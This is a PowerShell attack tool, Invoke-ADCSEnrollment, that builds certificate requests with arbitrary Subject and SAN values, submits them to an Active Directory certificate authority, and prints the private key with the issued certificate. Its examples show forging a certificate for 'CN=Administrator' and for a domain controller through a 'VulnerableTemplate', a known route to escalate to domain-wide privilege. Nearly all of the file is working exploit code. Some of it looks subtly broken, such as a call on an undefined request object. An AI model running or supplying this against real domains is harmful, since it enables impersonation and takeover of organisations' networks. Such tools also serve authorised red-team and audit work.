Function Invoke-ADCSEnrollment {
<#
.SYNOPSIS
    Request a client certificate from a given ADCS certificate authority.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Invoke-ADCSEnrollment submits a Certificate Request (including a newly generated private key) to a given CA and displays the response.
    It uses DCOM protocol by default, but can use WSTEP (Certificate Enrollment Web Service) protocol if credential is specified.

.PARAMETER CertificateAuthority
    Specifies the Certificate Authority to connect to, in the form of "<HOSTNAME>\<CA_COMMON_NAME>".

.PARAMETER CertificateTemplate
    Specifies the name of a certificate template to request a certificate from.

.PARAMETER Machine
    Uses the machine context for submitting the certificate request.

.PARAMETER Subject
    Specifies the principal distinguished name to be written into the Subject field of the certificate request.

.PARAMETER Upn
    Specifies one or more User Principal Names to be written into the Subject Alternative Name (SAN) Extension of the certificate request.

.PARAMETER Dns
    Specifies one or more DNS names to be written into the Subject Alternative Name (SAN) Extension of the Certificate Request.

.PARAMETER Credential
    Credentials used for enrollment via WSTEP protocol.

.EXAMPLE
    PS C:\> Invoke-ADCSEnrollment -CertificateAuthority "SRV-ADCS\ADATUM-CA" -CertificateTemplate "VulnerableTemplate" -Subject "CN=Administrator,CN=Users,DC=ADTUM,DC=CORP"

.EXAMPLE
    PS C:\> PSExec -i -s powershell.exe
    PS C:\> Invoke-ADCSEnrollment -CertificateAuthority "SRV-ADCS\ADATUM-CA" -CertificateTemplate "VulnerableTemplate" -Machine -Dns "DC.ADATUM.CORP"
#>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $CertificateAuthority,

        [ValidateNotNullOrEmpty()]
        [String]
        $CertificateTemplate,

        [Switch]
        $Machine,

        [ValidateNotNullOrEmpty()]
        [String]
        $Subject,

        [ValidateNotNullOrEmpty()]
        [mailaddress[]]
        $Upn,

        [ValidateNotNullOrEmpty()]
        [ValidateScript({$_ | ForEach-Object -Process {[Uri]::CheckHostName($_) -eq [UriHostnameType]::Dns}})]
        [String[]]
        $Dns,
    
        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    if ($Machine) {
        if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            Write-Error "This must be run as an Administrator when using the machine context" -ErrorAction Stop
        }
    }

    if ($Credential.UserName) {
        # Set CA URL for enrolling via WSTEP instead of DCOM
        $hostname = ($CertificateAuthority -split '\\').Get(0)
        $ca = ($CertificateAuthority -split '\\').Get(1)
        $CertificateAuthority = "https://$hostname/$($ca)_CES_UsernamePassword/service.svc/CES"
    }

    if (-not $Subject) {
        if ($Credential.UserName) {
            # Set identity DN
            $identity = (Get-LdapCurrentUser -Credential $Credential).UserName
            $Subject = (Get-LdapObject -Credential $Credential -Filter "(sAMAccountName=$identity)" -Properties distinguishedName).distinguishedName
        }
        elseif ($Machine) {
            # Set machine DN
            $Subject = Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\DataStore\Machine\0" -Name "DNName"
        }
        else {
            # Set user DN
             $Subject = ([DirectoryServices.AccountManagement.UserPrincipal]::Current).DistinguishedName.Replace(",", ", ")
        }
    }

    if (-not $CertificateTemplate){
        if ($Machine) {
            $CertificateTemplate = 'Machine'
        }
        else {
            $CertificateTemplate = 'User'
        }
    }

    # Generate private key and CSR
    Write-Verbose "[*] Subject: $Subject"
    Write-Verbose "[*] SAN: $(-join $Upn)$(-join $Dns)"
    Write-Verbose "[*] Template: $CertificateTemplate"
    $csr = New-CertRequestMessage -SubjectName $Subject -CertificateTemplate $CertificateTemplate -MachineContext:$Machine -Upn $Upn -Dns $Dns -Credential $Credential
    $privateKeyPem = $csr.PrivateKeyPem

    # Submit CSR
    Write-Verbose "[*] Certificate Authority: $CertificateAuthority"
    if ($certificate = Get-IssuedCertificate -CertificateAuthority $CertificateAuthority -CertificateRequest $csr.Request) {
        Write-Output "$($privateKeyPem)$($certificate)"
    }
}

Function Local:New-CertRequestMessage {
    Param (
        [String]
        $SubjectName,

        [String]
        $CertificateTemplate,

        [Switch]
        $MachineContext,

        [mailaddress[]]
        $Upn,

        [String[]]
        $Dns
    )

    Begin {
        Function Local:New-PrivateKey {
            Param ([bool]$MachineContext = $false)
            $cspInfo = New-Object -ComObject "X509Enrollment.CCspInformations" -Strict
            $cspInfo.AddAvailableCsps()
            $privateKey = New-Object -ComObject "X509Enrollment.CX509PrivateKey"
            $privateKey.Length = 2048
            $privateKey.KeySpec = 2 # 2 = XCN_AT_SIGNATURE
            $privateKey.KeyUsage = 0xffffff # 0xffffff = XCN_NCRYPT_ALLOW_ALL_USAGES
            $privateKey.MachineContext = $MachineContext
            $privateKey.ExportPolicy = 1 # 1 = XCN_NCRYPT_ALLOW_EXPORT_FLAG
            $privateKey.CspInformations = $cspInfo
            $privateKey.Create()
            return $privateKey
        }

        Function Local:EncodeLength {
            Param ([IO.BinaryWriter] $Stream, [int] $Length)
            [byte] $bytex80 = 0x80
            if ($Length -lt 0) {
                throw "Length must be non-negative"
            }
            if ($Length -lt $bytex80) {
                $Stream.Write(([byte] $Length))
            }
            else {
                $temp = $Length
                $bytesRequired = 0;
                while ($temp -gt 0) {
                    $temp = $temp -shr 8
                    $bytesRequired++
                }
                [byte]$byteToWrite = $bytesRequired -bor $bytex80
                $Stream.Write($byteToWrite)
                $iValue = ($bytesRequired - 1)
                [byte]$0ffByte = 0xff
                for ($i = $iValue; $i -ge 0; $i--) {
                    [byte]$byteToWrite = ($Length -shr (8 * $i) -band $0ffByte)
                    $Stream.Write($byteToWrite)
                }
            }
        }

        Function Local:EncodeIntegerBigEndian {
            Param ([IO.BinaryWriter] $Stream, [byte[]] $Value, [bool] $ForceUnsigned = $true)
            [byte] $Integer = 0x02
            $Stream.Write($Integer)
            $prefixZeros = 0
            for ($i = 0; $i -lt $Value.Length; $i++) {
                if ($Value[$i] -ne 0) {break} 
                $prefixZeros++
            }
            if (($Value.Length - $prefixZeros) -eq 0) {
                EncodeLength -Stream $Stream -Length 1
                $Stream.Write(([byte]0))
            }
            else {
                [byte]$newByte = 0x7f
                if (($ForceUnsigned) -AND ($Value[$prefixZeros] -gt $newByte)) {
                    EncodeLength -Stream $Stream -Length ($Value.Length - $prefixZeros +1)
                    $Stream.Write(([byte]0))
                }
                else {
                    EncodeLength -Stream $Stream -Length ($Value.Length - $prefixZeros)
                }
                for ($i = $prefixZeros; $i -lt $Value.Length; $i++) {
                    $Stream.Write($Value[$i])
                }
            }
        }

        Function Local:ConvertTo-PEM {
            Param ([String] $PrivateKey)
            $csp = New-Object Security.Cryptography.RSACryptoServiceProvider
            $cryptoKey = [Convert]::FromBase64String($PrivateKey)
            $csp.ImportCspBlob($cryptoKey)
            if ($csp.PublicOnly) {
                Write-Error "CSP does not contain a private key"
            }
            $outputStream = New-Object IO.StringWriter
            $parameters = $csp.ExportParameters($true)
            $stream = New-Object IO.MemoryStream
            $writer = New-Object IO.BinaryWriter($stream)
            $writer.Write([byte] 0x30)
            $innerStream = New-Object IO.MemoryStream
            $innerWriter = New-Object IO.BinaryWriter($innerStream)
            EncodeIntegerBigEndian -Stream $innerWriter -Value (New-Object byte[] @(0x00))
            EncodeIntegerBigEndian -Stream $innerWriter -Value $parameters.Modulus
            EncodeIntegerBigEndian -Stream $innerWriter -Value $parameters.Exponent
            EncodeIntegerBigEndian -Stream $innerWriter -Value $parameters.D
            EncodeIntegerBigEndian -Stream $innerWriter -Value $parameters.P
            EncodeIntegerBigEndian -Stream $innerWriter -Value $parameters.Q
            EncodeIntegerBigEndian -Stream $innerWriter -Value $parameters.DP
            EncodeIntegerBigEndian -Stream $innerWriter -Value $parameters.DQ
            EncodeIntegerBigEndian -Stream $innerWriter -Value $parameters.InverseQ
            [int] $length = $innerStream.Length
            EncodeLength -Stream $writer -Length $length
            $writer.Write($innerStream.GetBuffer(), 0, $length)
            $base64 = [Convert]::ToBase64String($stream.GetBuffer(), 0, [int] $stream.Length).ToCharArray()
            $outputStream.WriteLine("-----BEGIN RSA PRIVATE KEY-----")
            for ($i = 0; $i -lt $base64.Length; $i += 64) {
                $outputStream.WriteLine($base64, $i, [Math]::Min(64, $base64.Length - $i))
            }
            $outputStream.WriteLine("-----END RSA PRIVATE KEY-----");
            return $outputStream.ToString()
        }
    }

    Process {
        $privateKey = New-PrivateKey -MachineContext:$MachineContext
        $privateKeyBase64 = $privateKey.Export("PRIVATEBLOB", 1) # 1 = XCN_CRYPT_STRING_BASE64
        $privateKeyPEM = ConvertTo-PEM -PrivateKey $privateKeyBase64
        $objPkcs10 = New-Object -ComObject "X509Enrollment.CX509CertificateRequestPkcs10"
        if ($MachineContext) {
            $context = 2
        }
        else {
            $context = 1
        }
        $objPkcs10.InitializeFromPrivateKey($context, $privateKey, "")
        $objExtensionTemplate = New-Object -ComObject "X509Enrollment.CX509ExtensionTemplateName"
        $objExtensionTemplate.InitializeEncode($CertificateTemplate)
        $objPkcs10.X509Extensions.Add($objExtensionTemplate)
        if ($Upn -or $Dns) {
            $sanExtension = New-Object -ComObject X509Enrollment.CX509ExtensionAlternativeNames
            $sans = New-Object -ComObject X509Enrollment.CAlternativeNames
            foreach ($entry in $Upn) {
                $san = New-Object -ComObject X509Enrollment.CAlternativeName
                $san.InitializeFromString(11, $entry) # 11 = XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME
                $sans.Add($san)
                [void]([System.Runtime.Interopservices.Marshal]::ReleaseComObject($san))
            }
            foreach ($entry in $Dns) {
                $san = New-Object -ComObject X509Enrollment.CAlternativeName
                $san.InitializeFromString(3, $entry) # 3 = XCN_CERT_ALT_NAME_DNS_NAME
                $sans.Add($san)
                [void]([System.Runtime.Interopservices.Marshal]::ReleaseComObject($san))
            }
            $sanExtension.Critical = $True
            $sanExtension.InitializeEncode($sans)
            $objPkcs10.X509Extensions.Add($sanExtension)
        }
        $objDN = New-Object -ComObject "X509Enrollment.CX500DistinguishedName"
        try {
            $objDN.Encode($SubjectName, 0) # 0 = XCN_CERT_NAME_STR_NONE
        }
        catch {
            $objDN.Encode($SubjectName, 0x40000000) # 0x40000000 = XCN_CERT_NAME_STR_SEMICOLON_FLAG
        }
        $objPkcs10.Subject = $objDN
        $objEnroll = New-Object -ComObject "X509Enrollment.CX509Enrollment"
        $objEnroll.InitializeFromRequest($objPkcs10)
        $base64request = $objEnroll.CreateRequest(1) # 1 = XCN_CRYPT_STRING_BASE64
        $certificateRequest = @{
            Request = $base64request
            PrivateKeyPem = $privateKeyPEM
        }
        return (New-Object PSObject -Property $certificateRequest)
    }
}

Function Local:Get-IssuedCertificate {
    Param (
        [String]
        $CertificateAuthority,
        
        [String]
        $CertificateRequest,     

        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    $certificate = $null
    $requestID = 0
    $objCertRequest = New-Object -ComObject CertificateAuthority.Request
     if ($Credential.Username) {
        $CertRequest.SetCredential([Int] $null, 4, $Credential.UserName, [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($Credential.Password)))
    }
    $flags = 0x1 # CR_IN_BASE64
    If ($MachineContext) {
        $flags = $flags -bor 0x100000 # CR_IN_MACHINE
    }
    $status = $objCertRequest.Submit($flags, $CertificateRequest, "", $CertificateAuthority)
    if ($status -eq 0x3) {
        $requestID = $objCertRequest.GetRequestId()
        $status = $objCertRequest.RetrievePending($RequestID, $CertificateAuthority)
        if ($status -eq 0x3) {
            $certificate = $objCertRequest.GetCertificate(0x0)
        }
        else {
            $statusMessage = (New-Object ComponentModel.Win32Exception($objCertRequest.GetLastStatus())).Message
            $statusCode = "0x" + ('{0:x}' -f $objCertRequest.GetLastStatus())
            Write-Error "The certificate retrieval failed (disposition $status). $statusMessage ($statusCode)"
        }
    }
    else {
        $statusMessage = (New-Object ComponentModel.Win32Exception($objCertRequest.GetLastStatus())).Message
        $statusCode = "0x" + ('{0:x}' -f $objCertRequest.GetLastStatus())
        Write-Error "The certificate request failed (disposition $status). $statusMessage ($statusCode)"
    }
    [Runtime.Interopservices.Marshal]::ReleaseComObject($objCertRequest) | Out-Null
    return $certificate
}

Function Local:Get-LdapCurrentUser {
    Param (
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    try {
        [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
        if ($SSL) {
            $searcher = New-Object -TypeName DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
            $searcher.SessionOptions.SecureSocketLayer = $true
            $searcher.SessionOptions.VerifyServerCertificate = {$true}
        }
        else {
            $searcher = New-Object -TypeName DirectoryServices.Protocols.LdapConnection -ArgumentList $Server
        }
        if ($Credential.UserName) {
            $searcher.Credential = $Credential
        }

        # LDAP_SERVER_WHO_AM_I_OID = 1.3.6.1.4.1.4203.1.11.3
        $extRequest = New-Object -TypeName DirectoryServices.Protocols.ExtendedRequest "1.3.6.1.4.1.4203.1.11.3"
        $resp = [Text.Encoding]::ASCII.GetString($searcher.SendRequest($extRequest).ResponseValue)
        [pscustomobject] @{
            "NetbiosName"   = $($resp.split('\')[0].split(':')[-1])
            "UserName"      = $($resp.split('\')[1])
        }
    }
    catch {
        Write-Error $_
    }
}

Function Local:Get-LdapRootDSE {
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL
    )

    $searchString = "LDAP://$Server/RootDSE"
    if ($SSL) {
        # Note that the server certificate has to be trusted
        $authType = [DirectoryServices.AuthenticationTypes]::SecureSocketsLayer
    }
    else {
        $authType = [DirectoryServices.AuthenticationTypes]::Anonymous
    }
    $rootDSE = New-Object DirectoryServices.DirectoryEntry($searchString, $null, $null, $authType)
    return $rootDSE
}

Function Local:Get-LdapObject {
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBase,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateNotNullOrEmpty()]
        [String]
        $Filter = '(objectClass=*)',

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    Begin {
        if ((-not $SearchBase) -or $SSL) {
            # Get default naming context
            try {
                $rootDSE = Get-LdapRootDSE -Server $Server
                $defaultNC = $rootDSE.defaultNamingContext[0]
            }
            catch {
                Write-Error "Domain controller unreachable"
                continue
            }
            if (-not $SearchBase) {
                $SearchBase = $defaultNC
            }
        }
    }

    Process {
        try {
            if ($SSL) {
                $results = @()
                $domain = $defaultNC -replace 'DC=' -replace ',','.'
                [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
                $searcher = New-Object -TypeName System.DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
                $searcher.SessionOptions.SecureSocketLayer = $true
                $searcher.SessionOptions.VerifyServerCertificate = {$true}
                $searcher.SessionOptions.DomainName = $domain
                $searcher.AuthType = [DirectoryServices.Protocols.AuthType]::Negotiate
                if ($Credential.UserName) {
                    $searcher.Bind($Credential)
                }
                else {
                    $searcher.Bind()
                }
                if ($Properties -ne '*') {
                    $request = New-Object -TypeName System.DirectoryServices.Protocols.SearchRequest($SearchBase, $Filter, $SearchScope, $Properties)
                }
                else {
                    $request = New-Object -TypeName System.DirectoryServices.Protocols.SearchRequest($SearchBase, $Filter, $SearchScope)
                }
                $pageRequestControl = New-Object -TypeName System.DirectoryServices.Protocols.PageResultRequestControl -ArgumentList $PageSize
                $request.Controls.Add($pageRequestControl) | Out-Null
                $response = $searcher.SendRequest($request)
                while ($true) {
                    $response = $searcher.SendRequest($request)
                    if ($response.ResultCode -eq 'Success') {
                        foreach ($entry in $response.Entries) {
                            $results += $entry
                        }
                    }
                    $pageResponseControl = [DirectoryServices.Protocols.PageResultResponseControl]$response.Controls[0]
                    if ($pageResponseControl.Cookie.Length -eq 0) {
                        break
                    }
                    $pageRequestControl.Cookie = $pageResponseControl.Cookie
                }
                
            }
            else {
                $adsPath = "LDAP://$Server/$SearchBase"
                if ($Credential.UserName) {
                    $domainObject = New-Object DirectoryServices.DirectoryEntry($adsPath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
                    $searcher = New-Object DirectoryServices.DirectorySearcher($domainObject)
                }
                else {
                    $searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]$adsPath)
                }
                $searcher.SearchScope = $SearchScope
                $searcher.PageSize = $PageSize
                $searcher.CacheResults = $false
                $searcher.filter = $Filter
                $propertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
                $searcher.PropertiesToLoad.AddRange($propertiesToLoad) | Out-Null
                $results = $searcher.FindAll()
            }
        }
        catch {
            Write-Error $_
            continue
        }

        $results | Where-Object {$_} | ForEach-Object {
            if (Get-Member -InputObject $_ -name "Attributes" -Membertype Properties) {
                # Convert DirectoryAttribute object (LDAPS results)
                $p = @{}
                foreach ($a in $_.Attributes.Keys | Sort-Object) {
                    $values = @()
                    foreach ($v in $_.Attributes[$a].GetValues([byte[]])) {
                        $values += [Text.Encoding]::UTF8.GetString($v)
                    }
                    $p[$a] = $values
                }
            }
            else {
                $p = $_.Properties
            }
            $objectProperties = @{}
            $p.Keys | ForEach-Object {
                if (($_ -ne 'adspath') -and ($p[$_].count -eq 1)) {
                    $objectProperties[$_] = $p[$_][0]
                }
                elseif ($_ -ne 'adspath') {
                    $objectProperties[$_] = $p[$_]
                }
            }
            New-Object -TypeName PSObject -Property ($objectProperties)
        }
    }

    End {
        if ($results -and -not $SSL) {
            $results.dispose()
        }
        if ($searcher) {
            $searcher.dispose()
        }
    }
}

Add-Type -AssemblyName System.DirectoryServices.AccountManagement
